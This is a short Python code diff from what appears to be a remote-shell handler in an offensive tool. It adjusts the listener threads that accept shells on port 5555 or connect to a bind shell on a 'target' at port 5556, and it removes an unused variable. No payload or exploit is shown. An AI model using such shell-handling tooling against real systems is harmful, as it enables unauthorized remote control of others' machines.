@@ -69,21 +69,20 @@ def printListener():
             ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
             connectserver = Server(ipADDR, 5556, bindsocket=False)
             serverlist.append(connectserver)
-            async = threading.Thread(target=asyncore.loop)
+            async = threading.Thread(target=asyncore.loop, args=(0.1,))
             async.setDaemon(True)
             async.start()
     else:
         if not '5555' in str(serverlist):
             listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
             serverlist.append(listenerserver)
-            async = threading.Thread(target=asyncore.loop)
+            async = threading.Thread(target=asyncore.loop, args=(0.1,))
             async.setDaemon(True)
             async.start()
     return "pass"
 
 
 def interactShell(clientnumber):
-    sent = False
     clientnumber = int(clientnumber)
     from menu import clientMenuOptions
     for server in serverlist:
